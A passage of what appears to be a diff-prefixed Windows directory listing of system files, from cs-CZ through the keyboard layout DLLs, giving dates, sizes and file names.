+22/08/2013  15:39    <DIR>          cs-CZ
+29/10/2014  01:04            43,520 cscapi.dll
+29/10/2014  02:00            23,552 cscdll.dll
+29/10/2014  01:38           131,584 cscript.exe
+24/10/2017  20:27            38,912 csvde.exe
+29/10/2014  01:54             9,728 ctfmon.exe
+18/06/2013  12:38            27,136 ctl3d32.dll
+29/10/2014  01:32           313,344 cttune.exe
+29/10/2014  01:50            37,376 cttunesvr.exe
+18/06/2013  13:13            66,082 C_037.NLS
+18/06/2013  13:13            66,082 C_10000.NLS
+18/06/2013  13:13           162,850 C_10001.NLS
+18/06/2013  13:13           195,618 C_10002.NLS
+18/06/2013  13:13           177,698 C_10003.NLS
+18/06/2013  13:13            66,082 C_10004.NLS
+18/06/2013  13:13            66,082 C_10005.NLS
+18/06/2013  13:13            66,082 C_10006.NLS
+18/06/2013  13:13            66,082 C_10007.NLS
+18/06/2013  13:13           173,602 C_10008.NLS
+18/06/2013  13:13            66,082 C_10010.NLS
+18/06/2013  13:13            66,082 C_10017.NLS
+18/06/2013  13:13            66,082 C_10021.NLS
+18/06/2013  13:13            66,082 C_10029.NLS
+18/06/2013  13:13            66,082 C_10079.NLS
+18/06/2013  13:13            66,082 C_10081.NLS
+18/06/2013  13:13            66,082 C_10082.NLS
+18/06/2013  13:13            66,082 C_1026.NLS
+18/06/2013  13:13            66,082 C_1047.NLS
+18/06/2013  13:13            66,082 C_1140.NLS
+18/06/2013  13:13            66,082 C_1141.NLS
+18/06/2013  13:13            66,082 C_1142.NLS
+18/06/2013  13:13            66,082 C_1143.NLS
+18/06/2013  13:13            66,082 C_1144.NLS
+18/06/2013  13:13            66,082 C_1145.NLS
+18/06/2013  13:13            66,082 C_1146.NLS
+18/06/2013  13:13            66,082 C_1147.NLS
+18/06/2013  13:13            66,082 C_1148.NLS
+18/06/2013  13:13            66,082 C_1149.NLS
+18/06/2013  13:13            66,082 C_1250.NLS
+18/06/2013  13:13            66,082 C_1251.NLS
+22/08/2013  13:25            66,082 C_1252.NLS
+18/06/2013  13:13            66,082 C_1253.NLS
+18/06/2013  13:13            66,082 C_1254.NLS
+18/06/2013  13:13            66,082 C_1255.NLS
+18/06/2013  13:13            66,082 C_1256.NLS
+18/06/2013  13:13            66,082 C_1257.NLS
+18/06/2013  13:13            66,082 C_1258.NLS
+18/06/2013  13:13           189,986 C_1361.NLS
+18/06/2013  13:13           180,258 C_20000.NLS
+18/06/2013  13:13           186,402 C_20001.NLS
+18/06/2013  13:13           173,602 C_20002.NLS
+18/06/2013  13:13           185,378 C_20003.NLS
+18/06/2013  13:13           180,258 C_20004.NLS
+18/06/2013  13:13           187,938 C_20005.NLS
+18/06/2013  13:13            66,082 C_20105.NLS
+18/06/2013  13:13            66,082 C_20106.NLS
+18/06/2013  13:13            66,082 C_20107.NLS
+18/06/2013  13:13            66,082 C_20108.NLS
+18/06/2013  13:13            66,082 C_20127.NLS
+18/06/2013  13:13           139,810 C_20261.NLS
+18/06/2013  13:13            66,082 C_20269.NLS
+18/06/2013  13:13            66,082 C_20273.NLS
+18/06/2013  13:13            66,082 C_20277.NLS
+18/06/2013  13:13            66,082 C_20278.NLS
+18/06/2013  13:13            66,082 C_20280.NLS
+18/06/2013  13:13            66,082 C_20284.NLS
+18/06/2013  13:13            66,082 C_20285.NLS
+18/06/2013  13:13            66,082 C_20290.NLS
+18/06/2013  13:13            66,082 C_20297.NLS
+18/06/2013  13:13            66,082 C_20420.NLS
+18/06/2013  13:13            66,082 C_20423.NLS
+18/06/2013  13:13            66,082 C_20424.NLS
+18/06/2013  13:13            66,082 C_20833.NLS
+18/06/2013  13:13            66,082 C_20838.NLS
+18/06/2013  13:13            66,082 C_20866.NLS
+18/06/2013  13:13            66,082 C_20871.NLS
+18/06/2013  13:13            66,082 C_20880.NLS
+18/06/2013  13:13            66,082 C_20905.NLS
+18/06/2013  13:13            66,082 C_20924.NLS
+18/06/2013  15:35           165,410 c_20930.nls
+18/06/2013  15:35           165,410 c_20931.nls
+18/06/2013  13:13           180,770 C_20932.NLS
+18/06/2013  15:35           195,106 c_20933.nls
+18/06/2013  15:35           160,802 c_20935.nls
+18/06/2013  13:13           173,602 C_20936.NLS
+18/06/2013  15:35           191,522 c_20937.nls
+18/06/2013  15:35           165,410 c_20939.nls
+18/06/2013  13:13           177,698 C_20949.NLS
+18/06/2013  15:35           196,642 c_20950.nls
+18/06/2013  13:13            66,082 C_21025.NLS
+18/06/2013  13:13            66,082 C_21027.NLS
+18/06/2013  13:13            66,082 C_21866.NLS
+18/06/2013  13:13            66,082 C_28591.NLS
+18/06/2013  13:13            66,082 C_28592.NLS
+18/06/2013  13:13            66,082 C_28593.NLS
+18/06/2013  13:13            66,082 C_28594.NLS
+18/06/2013  13:13            66,082 C_28595.NLS
+18/06/2013  13:13            66,082 C_28596.NLS
+18/06/2013  13:13            66,082 C_28597.NLS
+18/06/2013  13:13            66,082 C_28598.NLS
+18/06/2013  13:13            66,082 C_28599.NLS
+18/06/2013  13:13            66,082 c_28603.nls
+18/06/2013  13:13            66,082 C_28605.NLS
+22/08/2013  13:25            66,594 C_437.NLS
+18/06/2013  13:13            66,082 C_500.NLS
+18/06/2013  13:13            66,082 C_708.NLS
+18/06/2013  13:13            66,594 C_720.NLS
+18/06/2013  13:13            66,594 C_737.NLS
+18/06/2013  13:13            66,594 C_775.NLS
+18/06/2013  13:13            66,594 C_850.NLS
+18/06/2013  13:13            66,594 C_852.NLS
+18/06/2013  13:13            66,594 C_855.NLS
+18/06/2013  13:13            66,594 C_857.NLS
+18/06/2013  13:13            66,594 C_858.NLS
+18/06/2013  13:13            66,594 C_860.NLS
+18/06/2013  13:13            66,594 C_861.NLS
+18/06/2013  13:13            66,594 C_862.NLS
+18/06/2013  13:13            66,594 C_863.NLS
+18/06/2013  13:13            66,594 C_864.NLS
+18/06/2013  13:13            66,594 C_865.NLS
+18/06/2013  13:13            66,594 C_866.NLS
+18/06/2013  13:13            66,594 C_869.NLS
+18/06/2013  13:13            66,082 C_870.NLS
+18/06/2013  13:13            66,594 C_874.NLS
+18/06/2013  13:13            66,082 C_875.NLS
+26/07/2016  13:40           162,850 C_932.NLS
+18/06/2013  13:13           196,642 C_936.NLS
+18/06/2013  13:13           196,642 C_949.NLS
+18/06/2013  13:13           196,642 C_950.NLS
+29/10/2014  01:05           222,720 C_G18030.DLL
+29/10/2014  01:05            11,776 C_IS2022.DLL
+29/10/2014  01:06            11,264 C_ISCII.DLL
+29/10/2014  01:03         4,067,840 d2d1.dll
+29/10/2014  00:57         1,065,472 d3d10.dll
+29/10/2014  00:59           316,928 d3d10core.dll
+12/11/2016  19:38           613,632 d3d10level9.dll
+29/10/2014  01:08         2,174,976 d3d10warp.dll
+29/10/2014  00:58           161,792 d3d10_1.dll
+29/10/2014  01:00           352,768 d3d10_1core.dll
+12/08/2016  01:58         1,946,176 d3d11.dll
+29/10/2014  01:53         1,065,984 d3d8.dll
+29/10/2014  02:00            12,288 d3d8thk.dll
+29/10/2014  03:12         1,907,384 d3d9.dll
+16/07/2017  23:55         3,551,744 D3DCompiler_47.dll
+29/10/2014  01:54           401,408 d3dim.dll
+29/10/2014  00:55           887,808 d3dim700.dll
+29/10/2014  02:00           594,944 d3dramp.dll
+29/10/2014  01:51            58,368 d3dxof.dll
+22/08/2013  15:39    <DIR>          da-DK
+29/10/2014  01:06             8,704 dabapi.dll
+11/02/2017  16:42           204,288 DafPrintProvider.dll
+29/10/2014  02:00            21,504 davhlpr.dll
+29/10/2014  01:44         2,984,448 dbgeng.dll
+29/10/2014  00:59         1,207,296 dbghelp.dll
+29/10/2014  01:58           112,640 dbnetlib.dll
+29/10/2014  01:58            18,944 dbnmpntw.dll
+22/02/2014  10:37           423,936 dcdiag.exe
+22/08/2013  03:21            50,688 dcgpofix.exe
+29/10/2014  02:00            11,776 dciman32.dll
+29/10/2014  01:58             9,728 dcomcnfg.exe
+29/10/2014  01:00           251,904 dcomp.dll
+24/07/2014  09:09           951,296 dcpromocmd.dll
+22/02/2014  09:43         1,241,600 dcpromoui.dll
+29/10/2014  01:47            38,400 ddodiag.exe
+29/10/2014  01:57            14,336 DDOIProxy.dll
+29/10/2014  01:54        15,784,448 DDORes.dll
+29/10/2014  00:52           544,256 ddraw.dll
+29/10/2014  01:00            43,008 ddrawex.dll
+22/08/2013  15:39    <DIR>          de-DE
+29/10/2014  01:40             9,216 DefaultDeviceManager.dll
+29/10/2014  01:39            21,504 DefaultPrinterProvider.dll
+29/10/2014  01:00            20,480 delegatorprovider.dll
+24/10/2017  20:27             4,988 delegwiz.inf
+20/01/2018  23:09           473,520 deployJava1.dll
+29/10/2014  01:40           168,448 desk.cpl
+29/10/2014  01:40            46,592 deskadp.dll
+29/10/2014  01:39            44,032 deskmon.dll
+29/10/2014  01:02            87,552 DevDispItemProvider.dll
+05/12/2015  05:58            81,032 devenum.dll
+29/10/2014  00:58           155,136 deviceaccess.dll
+29/10/2014  01:04            31,232 deviceassociation.dll
+29/10/2014  01:24           487,424 DeviceCenter.dll
+29/10/2014  01:49            29,696 DeviceDisplayStatusManager.dll
+29/10/2014  01:19           465,408 DevicePairing.dll
+29/10/2014  01:29           195,584 DevicePairingFolder.dll
+29/10/2014  01:49            20,480 DevicePairingProxy.dll
+29/10/2014  01:40            63,488 DevicePairingWizard.exe
+29/10/2014  01:39            91,648 DeviceProperties.exe
+29/10/2014  01:38            27,648 DeviceSetupStatusProvider.dll
+29/10/2014  02:04            11,776 DeviceUxRes.dll
+18/06/2013  13:03           145,640 devmgmt.msc
+29/10/2014  01:29           465,920 devmgr.dll
+29/10/2014  03:18           127,552 devobj.dll
+29/10/2014  01:05            50,176 devrtl.dll
+29/10/2014  01:32           561,664 dfrgui.exe
+29/10/2014  01:05            43,008 dfscli.dll
+24/10/2017  20:27            25,600 dfsfrsHost.exe
+22/08/2013  03:26         1,220,608 dfshim.dll
+24/10/2017  20:27            82,432 DfsRes.dll
+24/10/2017  20:27           268,640 dfsrHealthReport.xsl
+24/10/2017  20:27           565,760 DfsrHelper.dll
+24/10/2017  20:27           155,741 dfsrPropagationReport.xsl
+29/10/2014  01:38            57,856 DfsShlEx.dll
+29/10/2014  01:51            12,288 dhcpcmonitor.dll
+29/10/2014  01:05           292,864 dhcpcore.dll
+29/10/2014  01:05           228,864 dhcpcore6.dll
+29/10/2014  01:05            64,512 dhcpcsvc.dll
+29/10/2014  01:06            57,344 dhcpcsvc6.dll
+29/10/2014  00:54            77,312 DHCPQEC.DLL
+29/10/2014  01:54           142,848 dhcpsapi.dll
+29/10/2014  01:51            32,256 dialer.exe
+29/10/2014  01:34           339,968 difxapi.dll
+29/10/2014  01:00            31,232 dimsjob.dll
+29/10/2014  01:56            37,888 dimsroam.dll
+29/10/2014  01:55           136,192 dinput.dll
+29/10/2014  01:55           171,520 dinput8.dll
+29/10/2014  01:58            15,360 diskcomp.com
+29/10/2014  01:58            11,264 diskcopy.com
+29/10/2014  01:48         1,497,600 diskcopy.dll
+18/06/2013  13:08            47,679 diskmgmt.msc
+29/10/2014  01:47           145,920 diskpart.exe
+29/10/2014  01:58            17,920 diskperf.exe
+29/10/2014  01:46           284,672 diskraid.exe
+22/08/2013  03:14           319,488 diskshadow.exe
+21/01/2018  23:26    <DIR>          Dism
+22/02/2014  09:15           211,968 Dism.exe
+22/02/2014  09:12           459,776 DismApi.dll
+29/10/2014  01:56            15,872 dispex.dll
+29/10/2014  01:23         1,826,304 Display.dll
+29/10/2014  03:10         1,906,872 DisplaySwitch.exe
+29/10/2014  03:09            17,216 dllhost.exe
+29/10/2014  01:00             8,704 dllhst3g.exe
+29/10/2014  01:34           414,720 dmdlgs.dll
+29/10/2014  01:46           227,328 dmdskmgr.dll
+22/08/2013  04:16           372,224 dmdskres.dll
+22/08/2013  04:16             2,048 dmdskres2.dll
+29/10/2014  01:57            24,064 dmintf.dll
+29/10/2014  01:59            44,544 dmocx.dll
+29/10/2014  02:00            20,992 dmutil.dll
+29/10/2014  01:29           154,624 dmvdsitf.dll
+29/10/2014  01:49           113,664 dmview.ocx
+07/09/2017  18:24           499,200 dnsapi.dll
+22/08/2013  05:24           129,536 dnscmmc.dll
+24/10/2017  20:38            14,336 dnsperf.dll
+29/10/2014  01:40            35,328 docprop.dll
+24/10/2017  20:27           154,624 domadmin.dll
+24/10/2017  20:27           144,951 domain.msc
+29/10/2014  01:59            16,384 doskey.exe
+29/10/2014  01:51            70,656 dot3api.dll
+29/10/2014  01:44            59,904 dot3cfg.dll
+29/10/2014  01:52            49,152 dot3dlg.dll
+29/10/2014  00:47            47,616 dot3gpclnt.dll
+29/10/2014  01:43           242,176 dot3gpui.dll
+29/10/2014  01:38            54,272 dot3hc.dll
+29/10/2014  01:46            88,064 dot3msm.dll
+29/10/2014  01:40           292,352 dot3ui.dll
+22/08/2013  13:36    <DIR>          downlevel
+29/10/2014  01:06            12,800 dpapi.dll
+29/10/2014  01:20            72,704 dpapimig.exe
+29/10/2014  01:42            48,640 dpapiprovider.dll
+29/10/2014  01:39            77,312 DpiScaling.exe
+22/08/2013  04:05             8,192 dplaysvr.exe
+22/08/2013  04:05             8,192 dplayx.dll
+22/08/2013  04:05             8,192 dpmodemx.dll
+22/08/2013  04:05             8,192 dpnaddr.dll
+22/08/2013  04:05             8,192 dpnathlp.dll
+22/08/2013  04:05             8,192 dpnet.dll
+22/08/2013  04:05             8,192 dpnhpast.dll
+22/08/2013  04:05             8,192 dpnhupnp.dll
+22/08/2013  04:05             8,192 dpnlobby.dll
+22/08/2013  04:05             8,192 dpnsvr.exe
+22/08/2013  04:05             8,192 dpwsockx.dll
+22/08/2013  02:33           253,440 dpx.dll
+29/10/2014  01:29            68,096 driverquery.exe
+22/08/2013  15:46    <DIR>          drivers
+22/08/2013  15:39    <DIR>          DriverStore
+29/10/2014  01:58            21,504 drprov.dll
+29/10/2014  01:56            97,792 drvinst.exe
+29/10/2014  01:03           608,256 drvstore.dll
+24/10/2017  20:27           145,017 dsa.msc
+24/10/2017  20:27            40,960 dsacls.exe
+24/10/2017  20:27            55,296 dsadd.exe
+24/10/2017  20:27           880,640 dsadmin.dll
+29/10/2014  01:54            30,208 dsauth.dll
+24/10/2017  20:27           217,600 dsdbutil.exe
+29/10/2014  01:51           182,784 dsdmo.dll
+24/10/2017  20:27            69,120 dsget.exe
+29/10/2014  01:32            95,232 dskquota.dll
+29/10/2014  01:40           184,320 dskquoui.dll
+24/10/2017  20:27           175,616 dsmgmt.exe
+24/10/2017  20:27            53,248 dsmod.exe
+24/10/2017  20:27            28,672 dsmove.exe
+29/10/2014  01:47           517,120 dsound.dll
+29/10/2014  01:05            22,016 dsparse.dll
+29/10/2014  01:32           146,432 dsprop.dll
+29/10/2014  01:28           402,944 dsquery.dll
+24/10/2017  20:27            68,096 dsquery.exe
+24/10/2017  20:27            33,280 dsrm.exe
+29/10/2014  03:15            21,696 dsrole.dll
+22/08/2013  15:38           215,943 dssec.dat
+29/10/2014  01:46            47,616 dssec.dll
+29/10/2014  03:15           156,992 dssenh.dll
+24/10/2017  20:27           144,646 dssite.msc
+29/10/2014  01:29           120,832 Dsui.dll
+29/10/2014  01:15           671,744 dsuiext.dll
+24/10/2017  20:27           196,096 dsuiwiz.dll
+29/10/2014  01:46            32,256 dtsh.dll
+29/10/2014  00:52         1,461,248 dui70.dll
+29/10/2014  00:51           506,880 duser.dll
+29/10/2014  01:58            10,240 dvdplay.exe
+29/10/2014  01:39            22,528 dvdupgrd.exe
+29/10/2014  03:12           102,728 dwmapi.dll
+29/10/2014  00:54         1,945,600 dwmcore.dll
+12/05/2017  16:13         1,559,552 DWrite.dll
+29/10/2014  01:42           138,240 DWWIN.EXE
+29/10/2014  01:40           288,768 dxdiag.exe
+29/10/2014  01:20           264,192 dxdiagn.dll
+29/10/2014  03:12           430,176 dxgi.dll
+29/10/2014  01:24         1,389,056 DxpTaskSync.dll
+10/09/2015  16:17           416,256 dxtmsft.dll
+07/09/2017  18:37           279,040 dxtrans.dll
+29/10/2014  03:12           116,696 dxva2.dll
+22/08/2013  03:22           164,352 eapa3hst.dll
+22/08/2013  03:39            93,184 eapacfg.dll
+22/08/2013  03:21           168,448 eapahost.dll
+29/10/2014  01:01           250,880 eapp3hst.dll
+29/10/2014  00:43           278,016 eappcfg.dll
+29/10/2014  01:17            91,648 eappgnui.dll
+29/10/2014  00:52           266,752 eapphost.dll
+29/10/2014  00:59            56,320 eappprxy.dll
+29/10/2014  01:04            24,576 eapprovp.dll
+29/10/2014  00:58            73,216 EAPQEC.DLL
+29/10/2014  01:27           277,504 EaseOfAccessDialog.exe
+29/10/2014  01:41           147,968 easwrt.dll
+29/10/2014  01:11            88,576 efsadu.dll
+29/10/2014  01:34           321,024 efscore.dll
+29/10/2014  01:34            11,776 efsui.exe
+29/10/2014  01:59            27,648 efsutil.dll
+29/10/2014  00:35           103,936 efswrt.dll
+22/08/2013  15:39    <DIR>          el-GR
+29/10/2014  01:30           184,832 els.dll
+29/10/2014  01:00            59,392 ELSCore.dll
+22/08/2013  03:32            12,800 elsext.dll
+29/10/2014  01:43           196,096 elshyph.dll
+29/10/2014  01:05           589,824 elslad.dll
+29/10/2014  01:00            25,088 elsTrans.dll
+22/08/2013  16:05    <DIR>          en
+22/08/2013  15:39    <DIR>          en-GB
+21/01/2018  23:26    <DIR>          en-US
+29/10/2014  01:00            20,992 encapi.dll
+29/10/2014  00:50            71,168 eqossnap.dll
+22/08/2013  15:39    <DIR>          es-ES
+29/10/2014  00:55           367,616 es.dll
+30/07/2016  16:36         2,537,472 esent.dll
+29/10/2014  01:04            61,440 esentprf.dll
+29/10/2014  01:04           272,896 esentutl.exe
+22/08/2013  15:39    <DIR>          et-EE
+22/08/2013  04:16            32,768 ETWESEProviderResources.dll
+29/10/2014  01:47            15,360 eventcls.dll
+29/10/2014  01:48            32,768 eventcreate.exe
+18/06/2013  12:39            17,935 EventViewer_EventDetails.xsl
+29/10/2014  01:52            80,896 eventvwr.exe
+18/06/2013  12:39           145,127 eventvwr.msc
+29/10/2014  01:57            49,664 expand.exe
+29/10/2014  03:10         2,207,488 explorer.exe
+06/06/2017  19:08         2,712,576 ExplorerFrame.dll
+18/06/2013  12:17           380,957 expsrv.dll
+29/10/2014  01:54            29,184 extrac32.exe
+22/02/2014  11:25            28,160 f3ahvoas.dll
+08/12/2014  19:42           372,408 Faultrep.dll
+29/10/2014  01:59            22,528 fc.exe
+31/10/2014  03:28            12,800 fcab.exe
+25/10/2017  20:47            11,264 FcSrv_ps.dll
+29/10/2014  01:34            27,648 FdDevQuery.dll
+29/10/2014  01:38           130,048 fde.dll
+29/10/2014  00:44           141,312 fdeploy.dll
+29/10/2014  00:55            44,544 fdPnp.dll
+29/10/2014  01:31           259,584 fdprint.dll
+29/10/2014  01:01            28,160 fdProxy.dll
+29/10/2014  00:57            92,672 fdSSDP.dll
+29/10/2014  01:36            25,088 fdWNet.dll
+29/10/2014  00:52           145,920 fdWSD.dll
+29/10/2014  01:59            38,400 feclient.dll
+22/08/2013  15:39    <DIR>          fi-FI
+29/10/2014  01:29           478,208 filemgmt.dll
+29/10/2014  01:59            15,360 find.exe
+29/10/2014  01:28            55,808 findnetprinters.dll
+29/10/2014  01:04            29,184 findstr.exe
+29/10/2014  01:05            13,312 finger.exe
+29/10/2014  00:58           543,232 FirewallAPI.dll
+29/10/2014  00:42           865,280 FirewallControlPanel.dll
+29/10/2014  01:49            16,384 fixmapi.exe
+29/10/2014  01:05            16,896 fltLib.dll
+29/10/2014  01:04            22,016 fltMC.exe
+29/10/2014  01:03            47,616 fmifs.dll
+29/10/2014  01:52            97,792 fms.dll
+29/10/2014  01:39            97,792 Fondue.exe
+29/10/2014  01:28           812,032 fontext.dll
+29/10/2014  02:00            77,824 fontsub.dll
+29/10/2014  01:44           104,960 fontview.exe
+29/10/2014  01:48            40,960 forfiles.exe
+29/10/2014  01:04            42,496 format.com
+29/10/2014  01:43            92,672 fphc.dll
+22/08/2013  15:39    <DIR>          fr-FR
+29/10/2014  01:00           220,160 framedyn.dll
+29/10/2014  01:00           252,416 framedynos.dll
+29/10/2014  01:33            63,488 frprov.dll
+18/06/2013  12:23           144,909 fsmgmt.msc
+29/10/2014  01:53           113,664 fsutil.exe
+29/10/2014  01:49            48,128 fsutilext.dll
+29/10/2014  01:05            48,128 ftp.exe
+29/10/2014  00:58           126,976 fundisc.dll
+29/10/2014  00:56            90,112 fwcfg.dll
+05/02/2016  15:07           272,384 FWPUCLNT.DLL
+12/05/2016  15:37            50,176 FwRemoteSvr.dll
+29/10/2014  01:50            54,784 g711codc.ax
+29/10/2014  01:47           123,392 gcdef.dll
+08/09/2017  16:57         1,084,928 gdi32.dll
+11/08/2017  01:52         1,491,456 GdiPlus.dll
+29/10/2014  01:29            64,512 getmac.exe
+13/08/2017  15:52         5,274,624 glcndFilter.dll
+29/10/2014  02:00           435,200 glmf32.dll
+22/10/2015  15:58           200,704 GlobCollationHost.dll
+29/10/2014  01:00           111,104 globinputhost.dll
+29/10/2014  01:59           140,288 glu32.dll
+12/05/2016  17:43           115,704 gpapi.dll
+29/10/2014  01:25         1,058,816 gpedit.dll
+18/06/2013  12:25           147,439 gpedit.msc
+24/10/2017  20:27            48,128 gpfixup.exe
+24/10/2017  20:27           146,446 gpmc.msc
+24/10/2017  20:27           720,896 gpme.dll
+24/10/2017  20:27           146,712 gpme.msc
+11/08/2017  20:59         1,729,024 gpmgmt.dll
+10/01/2017  19:36         1,496,064 GPOAdmin.dll
+10/01/2017  19:43            95,744 GPOAdminCommon.dll
+10/01/2017  19:39           975,360 GPOAdminCustom.dll
+21/01/2018  23:01         5,023,744 gppref.dll
+21/01/2018  23:01           577,024 gpprefbr.dll
+15/06/2017  14:14           580,608 gpprefcl.dll
+21/01/2018  23:01           146,432 gpprefcn.dll
+29/10/2014  01:37            32,768 gpprnext.dll
+24/10/2017  20:27           218,624 gpregistrybrowser.dll
+29/10/2014  01:45           192,512 gpresult.exe
+10/03/2016  17:05           472,576 GPRSoP.dll
+12/05/2016  15:40            34,304 gpscript.dll
+29/10/2014  01:04            30,720 gpscript.exe
+24/10/2017  20:27           146,019 gptedit.msc
+29/10/2014  01:29            19,968 gptext.dll
+29/10/2014  01:57            15,872 gpupdate.exe
+22/08/2013  15:39    <DIR>          GroupPolicy
+22/08/2013  15:39    <DIR>          GroupPolicyUsers
+29/10/2014  01:38            16,896 grpconv.exe
+29/10/2014  01:05            66,560 hbaapi.dll
+29/10/2014  01:38            34,816 hcproviders.dll
+29/10/2014  01:38           232,448 hdwwiz.cpl
+29/10/2014  01:52            62,976 hdwwiz.exe
+22/08/2013  15:39    <DIR>          he-IL
+29/10/2014  01:59             9,728 help.exe
+29/10/2014  01:27            47,104 HelpPaneProxy.dll
+29/10/2014  00:42           539,648 hgcpl.dll
+29/10/2014  01:58            15,872 hh.exe
+29/10/2014  01:22           536,576 hhctrl.ocx
+29/10/2014  01:40            45,568 hhsetup.dll
+29/10/2014  01:05            26,624 hid.dll
+29/10/2014  01:57            32,256 hidphone.tsp
+29/10/2014  01:59            30,720 hidserv.dll
+08/02/2016  20:29            99,328 hlink.dll
+29/10/2014  00:39           454,144 hnetcfg.dll
+29/10/2014  01:51            15,872 hnetmon.dll
+29/10/2014  01:04            11,776 HOSTNAME.EXE
+22/08/2013  15:39    <DIR>          hr-HR
+16/07/2015  19:50           341,504 html.iec
+29/10/2014  01:06            26,112 httpapi.dll
+29/10/2014  01:59            35,328 htui.dll
+22/08/2013  15:39    <DIR>          hu-HU
+29/10/2014  01:52            23,040 ias.dll
+29/10/2014  01:46            81,408 iasacct.dll
+29/10/2014  01:46            59,904 iasads.dll
+29/10/2014  01:51            58,880 iasdatastore.dll
+29/10/2014  01:45            92,672 iashlpr.dll
+22/08/2013  03:53            19,968 iashost.exe
+29/10/2014  01:29           503,808 IasMigPlugin.dll
+29/10/2014  01:46           171,520 iasnap.dll
+29/10/2014  01:47            41,472 iaspolcy.dll
+29/10/2014  01:46           203,264 iasrad.dll
+29/10/2014  01:42           144,384 iasrecst.dll
+08/01/2016  17:22           223,232 iassam.dll
+29/10/2014  01:41           381,952 iassdo.dll
+29/10/2014  01:47           135,680 iassvcs.dll
+29/10/2014  01:05            29,696 icacls.exe
+04/02/2017  17:17           223,232 icm32.dll
+22/08/2013  04:14             3,072 icmp.dll
+29/10/2014  01:56            20,992 icmui.dll
+29/10/2014  01:57            11,264 IconCodecService.dll
+22/08/2013  15:38             8,798 icrav03.rat
+29/10/2014  01:39           201,728 icsigd.dll
+29/10/2014  01:53            15,360 icsunattend.exe
+22/08/2013  15:39    <DIR>          icsxml
+29/10/2014  00:37            85,504 IdCtrls.dll
+29/10/2014  02:00            33,280 idndl.dll
+31/10/2014  03:14           112,128 IEAdvpack.dll
+26/07/2013  17:02           616,104 ieapfltr.dat
+07/11/2017  19:58           710,144 ieapfltr.dll
+14/10/2017  06:24           331,776 iedkcs32.dll
+31/10/2014  03:23            47,616 ieetwproxystub.dll
+14/11/2017  01:37        13,679,616 ieframe.dll
+07/09/2017  18:38           128,000 iepeers.dll
+31/10/2014  03:15            30,720 iernonce.dll
+14/10/2017  06:50         2,293,760 iertutil.dll
+31/10/2014  03:24            62,464 iesetup.dll
+31/10/2014  02:56            90,624 iesysprep.dll
+10/11/2015  00:04           476,160 ieui.dll
+13/03/2015  01:55            16,303 ieuinit.inf
+31/10/2014  03:12           115,712 ieUnatt.exe
+31/10/2014  03:27           152,064 iexpress.exe
+29/10/2014  00:53            24,576 ifmon.dll
+06/06/2017  18:02           197,120 ifsutil.dll
+29/10/2014  01:57            12,288 ifsutilx.dll
+22/08/2013  04:17             2,048 iismui.dll
+29/10/2014  01:54            15,872 iisreset.exe
+29/10/2014  01:52             9,728 iisrstap.dll
+29/10/2014  01:48           168,960 iisRtl.dll
+29/10/2014  03:07            29,960 imaadp32.acm
+29/10/2014  03:06            74,824 imagehlp.dll
+22/08/2013  04:16        48,847,872 imageres.dll
+22/08/2013  04:16           705,536 imagesp1.dll
+29/10/2014  01:38           119,808 imapi.dll
+29/10/2014  01:34           442,368 imapi2.dll
+29/10/2014  01:31           761,344 imapi2fs.dll
+22/08/2013  15:39    <DIR>          IME
+31/10/2014  02:24            40,448 imgutil.dll
+29/10/2014  01:59           141,312 imm32.dll
+07/11/2017  20:22           880,640 inetcomm.dll
+14/10/2017  06:23         2,058,752 inetcpl.cpl
+29/10/2014  00:57            53,760 inetmib1.dll
+22/08/2013  04:14            84,480 INETRES.dll
+21/01/2018  23:26    <DIR>          inetsrv
+29/10/2014  01:51            10,240 InfDefaultInstall.exe
+25/10/2017  20:47            17,920 infoadmn.dll
+25/10/2017  20:47            11,776 infoctrs.dll
+11/10/2016  16:55           226,816 input.dll
+21/01/2018  14:21    <DIR>          InputMethod
+29/10/2014  00:39           205,312 InputSwitch.dll
+31/10/2014  02:56            91,136 inseng.dll
+22/08/2013  15:39    <DIR>          InstallShield
+29/10/2014  01:13             8,704 instnm.exe
+25/10/2017  20:47            10,752 Interop.DfsrHelper.dll
+29/10/2014  01:31           392,704 intl.cpl
+22/08/2013  04:15             2,048 iologmsg.dll
+29/10/2014  01:00            31,232 ipconfig.exe
+12/03/2016  00:47           121,912 IPHLPAPI.DLL
+22/08/2013  15:39    <DIR>          Ipmi
+29/10/2014  02:00             3,072 iprop.dll
+29/10/2014  01:58             9,216 iprtprio.dll
+07/11/2017  20:46           285,184 iprtrmgr.dll
+29/10/2014  01:20           770,048 ipsecsnp.dll
+29/10/2014  01:17           439,296 ipsmsnap.dll
+29/10/2014  01:48           147,456 iscsicli.exe
+29/10/2014  01:41           216,064 iscsicpl.dll
+29/10/2014  01:52           120,320 iscsicpl.exe
+03/09/2016  17:21            55,296 iscsidsc.dll
+29/10/2014  01:58             9,728 iscsied.dll
+22/07/2017  17:32            27,136 iscsium.dll
+09/09/2016  14:02            67,584 iscsiwmi.dll
+29/10/2014  01:58            95,744 iscsiwmiv2.dll
+22/08/2013  15:39    <DIR>          it-IT
+29/10/2014  01:38           165,376 itircl.dll
+07/11/2017  20:27           151,040 itss.dll
+29/10/2014  01:58            48,128 iyuv_32.dll
+22/08/2013  15:39    <DIR>          ja-JP
+31/10/2014  02:57            60,416 JavaScriptCollectionAgent.dll
+07/11/2017  20:39           662,016 jscript.dll
+07/11/2017  20:27         4,509,696 jscript9.dll
+23/05/2015  03:04           620,032 jscript9diag.dll
+31/10/2014  03:16            47,104 jsproxy.dll
+22/08/2013  04:14             7,168 kbd101.DLL
+22/08/2013  04:14             7,168 kbd101a.DLL
+22/08/2013  04:14             7,168 kbd101b.DLL
+22/08/2013  04:14             7,168 kbd101c.DLL
+22/08/2013  04:14             7,168 kbd103.DLL
+22/08/2013  04:14             7,680 kbd106.dll
+22/08/2013  04:14             7,680 kbd106n.dll
+22/08/2013  04:14             6,656 KBDA1.DLL
+22/08/2013  04:14             6,656 KBDA2.DLL
+22/08/2013  04:14             7,168 KBDA3.DLL
+22/08/2013  04:14             7,168 KBDAL.DLL
+22/08/2013  04:14             6,656 KBDARME.DLL
+22/08/2013  04:15             7,168 kbdarmph.dll
+22/08/2013  04:14             7,168 kbdarmty.dll
+22/08/2013  04:15             6,656 KBDARMW.DLL
+22/08/2013  04:14             7,680 kbdax2.dll
+22/08/2013  04:14             6,656 KBDAZE.DLL
+22/08/2013  04:14             6,656 KBDAZEL.DLL
+22/08/2013  04:14             6,656 KBDAZST.DLL
+24/07/2014  10:51             7,168 KBDBASH.DLL
+22/08/2013  04:14             7,168 KBDBE.DLL
+22/08/2013  04:14             7,168 KBDBENE.DLL
+22/08/2013  04:15             6,656 KBDBGPH.DLL
+22/08/2013  04:14             7,168 KBDBGPH1.DLL
